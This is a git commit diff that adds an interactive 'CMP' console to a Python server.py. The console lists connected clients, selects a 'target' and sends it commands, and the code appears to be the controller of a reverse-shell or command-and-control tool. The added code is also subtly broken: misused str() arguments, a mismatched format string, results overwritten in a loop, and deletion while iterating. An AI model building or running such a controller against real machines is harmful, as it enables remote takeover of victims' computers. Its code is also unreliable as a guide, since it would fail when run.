615f47ffb4f3d63c820fb913a784f860a0b876dc
Efecan Arat <efecanarat@gmail.com>
2022-07-15 14:01:54 +0300

    Interactive shell created.

--- server.py
+++ server.py
@@ -66,3 +66,53 @@ def accept_connection():
 
         except:
             print("Error connection could not established.")
+
+
+# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client.
+# Interactive prompt for sending commands.
+def start_cmp():
+    cmd = input("CMP: ")
+
+    if cmd == "help":
+        cmp_help()
+
+    elif "list" in cmd:
+        list_connections()
+
+    elif "select" in cmd:
+        conn = get_target(cmd)
+        if conn is not None:
+            send_target_commands(conn)
+
+    else:
+        print("Unknown command, to see all commands enter help command.")
+
+
+# Display a help message for cmp.
+def cmp_help():
+    pass
+
+
+# Display all current active connnections with the client.
+def list_connections():
+    results = ""
+
+    if not connections:
+        print("There is no client connected to you\n")
+
+    else:
+
+        for i, conn in enumerate(connections):
+            try:
+                conn.send(str.encode(" "))
+                conn.recv(201480)
+            except:
+                del connections[i]
+                del addresses[i]
+                continue
+
+            results = "{}   {}  {}  \n".format(
+                str(i), str(addresses[i][0], addresses[i][1])
+            )
+
+        print("---Clients---\n{}".format(results))
